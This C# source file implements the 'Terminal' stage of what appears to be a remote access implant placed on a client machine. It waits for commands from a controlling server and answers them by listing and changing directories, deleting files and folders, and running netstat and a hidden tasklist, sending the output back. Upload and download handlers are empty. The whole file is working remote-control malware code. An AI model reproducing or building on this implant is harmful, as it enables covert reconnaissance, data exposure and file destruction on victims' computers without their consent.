using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Diagnostics;
using Reno.Comm;

namespace Reno.Stages
{
    public class Terminal
    {
        CommChannel channel;
        string pwd = ".";

        /// <summary>
        /// Constructor for the Terminal program to be placed on the client machine
        /// </summary>
        /// <param name="channel">Communications channel to the server</param>
        public Terminal(CommChannel channel)
        {
            this.channel = channel;
        }
        /// <summary>
        /// Main loop for the terminal. Loop continues to listen to commands from the server until told to disconnect
        /// </summary>
        public void Execute()
        {
            bool run = true;
            while (run)
            {
                // Wait for a header - once its received execute the command
                CommHeader header = channel.ReceiveHeader();
                switch (header.Command)
                {
                    case CommChannel.EXIT:
                        run = false;
                        break;
                    case CommChannel.LS:
                        string directory = "";

                        if (header.DataLength == 0)
                        {
                            DirectoryInfo dir = new DirectoryInfo(pwd);
                            Console.WriteLine("Directory {0}", dir.FullName);
                            directory += dir.FullName + "\n";
                            foreach (DirectoryInfo i in dir.EnumerateDirectories())
                            {
                                directory += i.FullName + "\n";
                            }
                            foreach (string file in Directory.EnumerateFiles(pwd))
                            {
                                directory += file + "\n";
                            }

                            byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(directory));
                            CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                            channel.SendHeader(h);
                            channel.SendBytes(bytes);
                        }
                        else
                        {
                            byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
                            string sDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
                            if (Directory.Exists(sDir))
                            {
                                DirectoryInfo dir = new DirectoryInfo(sDir);
                                Console.WriteLine("Directory {0}", dir.FullName);
                                directory += dir.FullName + "\n";
                                foreach (DirectoryInfo i in dir.EnumerateDirectories())
                                {
                                    directory += i.FullName + "\n";
                                }
                                foreach (string file in Directory.EnumerateFiles(sDir))
                                {
                                    directory += file + "\n";
                                }

                                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(directory));
                                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                                channel.SendHeader(h);
                                channel.SendBytes(bytes);
                            }
                            else
                            {
                                string error = "Directory does not exist";
                                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, error.Length);
                                Console.WriteLine("[*] Sending {0} - {1}", error, sDir);
                                channel.SendHeader(h);
                                channel.SendBytes(Encoding.UTF8.GetBytes(error));
                            }
                        }
                        break;
                    case CommChannel.PWD:
                        DirectoryInfo pwdInfo = new DirectoryInfo(pwd);
                        byte[] msg = channel.Compress(Encoding.UTF8.GetBytes(pwdInfo.FullName));
                        CommHeader pwdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, msg.Length);
                        Console.WriteLine("[*] Sending {0}", pwdInfo.FullName);
                        channel.SendHeader(pwdHeader);
                        channel.SendBytes(msg);
                        break;
                    case CommChannel.CD:
                        if(header.DataLength == 0)
                        {
                            Console.WriteLine("No argument");
                            pwd = "C:\\";
                            byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(pwd));
                            CommHeader cdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                            channel.SendHeader(cdHeader);
                            channel.SendBytes(bytes);
                        }
                        else
                        {
                            byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
                            string tmpDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
                            if (Directory.Exists(tmpDir))
                            {
                                pwd = tmpDir;
                            } 
                            byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(pwd));
                            CommHeader cdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                            channel.SendHeader(cdHeader);
                            channel.SendBytes(bytes);
                        }
                        break;
                    case CommChannel.DELETE:
                        // Deletes a file or directory provided as an argument
                        byte[] objectToDelete = channel.ReceiveBytes(header.DataLength);
                        string fileSystemObject = Encoding.UTF8.GetString(channel.Decompress(objectToDelete));
                        // Do some checking on the string - if the object is not fully qualified, make it
                        // I.e delete c:\Users.txt should be used if supplied
                        // i.e. delete users.txt should expand users.txt to pwd + \users.txt
                        Regex fullPath = new Regex(@"^\\\\|^\\|^[a-zA-z]:\\");
                        string returnMessage = "";
                        if (!fullPath.IsMatch(fileSystemObject))
                        {
                            fileSystemObject = Path.Combine(pwd, Path.GetFileName(fileSystemObject));
                        }
                        
                        if (File.Exists(fileSystemObject))
                        {
                            // Try to delete the file
                            try
                            {
                                File.Delete(fileSystemObject);
                                returnMessage = "File deleted";
                                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
                                CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                                channel.SendHeader(deleteHeader);
                                channel.SendBytes(bytes);
                            }
                            catch(ArgumentException e)
                            {
                                returnMessage = "Error deleting file " + e.Message;
                                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
                                CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                                channel.SendHeader(deleteHeader);
                                channel.SendBytes(bytes);
                            }
                        }
                        else if (Directory.Exists(fileSystemObject))
                        {
                            try
                            {
                                Directory.Delete(fileSystemObject);
                                returnMessage = "Directory deleted";
                                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
                                CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                                channel.SendHeader(deleteHeader);
                                channel.SendBytes(bytes);
                            }
                            catch(Exception e)
                            {
                                returnMessage = "Error deleting directory " + e.Message;
                                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
                                CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                                channel.SendHeader(deleteHeader);
                                channel.SendBytes(bytes);
                            }
                        }
                        else
                        {
                            returnMessage = "No such file system object";
                            byte[] bytes = Encoding.UTF8.GetBytes(returnMessage);
                            CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                            channel.SendHeader(deleteHeader);
                            channel.SendBytes(bytes);
                        }
                        break;
                    case CommChannel.UPLOAD:
                        break;
                    case CommChannel.DOWNLOAD:
                        break;
                    case CommChannel.NETSTAT:
                        Process netstat = new Process();
                        ProcessStartInfo netstatInfo = new ProcessStartInfo();
                        netstatInfo.FileName = "netstat.exe";
                        netstatInfo.Arguments = "-ant";
                        netstatInfo.UseShellExecute = false;
                        netstatInfo.RedirectStandardOutput = true;
                        netstat.StartInfo = netstatInfo;
                        netstat.Start();
                        string netstatOutput = netstat.StandardOutput.ReadToEnd();
                        byte[] netstatBytes = Encoding.UTF8.GetBytes(netstatOutput);
                        CommHeader netstatHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, netstatBytes.Length);
                        channel.SendHeader(netstatHeader);
                        channel.SendBytes(netstatBytes);
                        break;
                    case CommChannel.PS:
                        Process ps = new Process();
                        ProcessStartInfo psInfo = new ProcessStartInfo();
                        psInfo.FileName = "tasklist.exe";
                        psInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        psInfo.UseShellExecute = false;
                        psInfo.RedirectStandardOutput = true;
                        ps.StartInfo = psInfo;
                        ps.Start();
                        string output = ps.StandardOutput.ReadToEnd();
                        Console.WriteLine(output);
                        byte[] psBytes = Encoding.UTF8.GetBytes(output);
                        CommHeader psHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, psBytes.Length);
                        channel.SendHeader(psHeader);
                        channel.SendBytes(psBytes);
                        break;
                }
            }
        }

        /// <summary>
        /// Creates a new CommHeader for transmission
        /// </summary>
        /// <param name="command">Command to execute</param>
        /// <param name="compression">Compression method that is used</param>
        /// <param name="type">Type of message: Command or Response</param>
        /// <param name="id">Message Id</param>
        /// <param name="data_length">Length of data</param>
        /// <returns></returns>
        private CommHeader CreateHeader(byte command, byte compression, byte type, int id, int data_length)
        {
            return new CommHeader(command, compression, type, 0, id, data_length);
        }
    }
}
